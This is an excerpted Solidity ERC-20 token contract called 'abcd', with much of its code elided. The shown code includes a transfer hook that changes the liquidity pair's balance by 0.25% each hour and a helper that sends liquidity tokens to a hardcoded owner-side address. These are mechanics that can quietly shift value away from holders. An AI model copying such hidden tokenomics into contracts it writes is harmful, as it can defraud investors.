...
contract abcd is IERC20, Ownable {
    uint buyFee = 2;
    uint sellFee = 2;
    ...
    address systemAddress = address(0x57ECAAaE50bC7DDF4F403ea3FD6AeDB036b73626);
    string Name = "abcd";
    string Symbol = "abcd";
    uint8 Decimals = 18;
    uint256 Supply = 1000000000000;
    address ReceiveAddress = address(0x766dF0CeDC44Ee846790201fBe9f728ea39cD03F);
    ...
    function _tokenTransfer(
        ...
        if (isBuy || isSell || isTransfer){
            if (!hasincr[block.timestamp / 1 hours] && balanceOf(_mainPair) > 0){
                uint incrNum = _balances[_mainPair] * 25 / 10000;
    ...
    function addL (uint256 tokenAmount, uint tokenB) private {
        _swapRouter.addLiquidity(
            _weth, address(this), tokenB, tokenAmount, 0, 0, systemAddress, block.timestamp
        );
    }
